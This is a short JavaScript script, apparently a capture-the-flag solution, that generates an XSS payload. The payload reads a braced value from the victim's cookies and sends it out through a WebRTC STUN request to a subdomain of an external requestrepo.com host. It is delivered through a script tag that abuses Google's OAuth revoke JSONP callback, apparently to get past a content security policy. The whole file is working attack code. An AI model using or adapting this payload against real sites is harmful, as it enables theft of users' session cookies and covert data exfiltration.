const clientCode = function(){
  let f = document.cookie.match(/{(.+?)}/)?.[1]||'notfound';
  let p =new RTCPeerConnection({iceServers:[{urls:"stun:"+f+".ux3s7632.requestrepo.com"}]});
  p.createDataChannel("");
  p.setLocalDescription();
}

const payload = encodeURIComponent(
  `(${clientCode.toString()})`
    .replaceAll('\n', '')
    .replaceAll('"', "'")
);

console.log(`<script src="https://accounts.google.com/o/oauth2/revoke?callback=${payload}"></script>`)
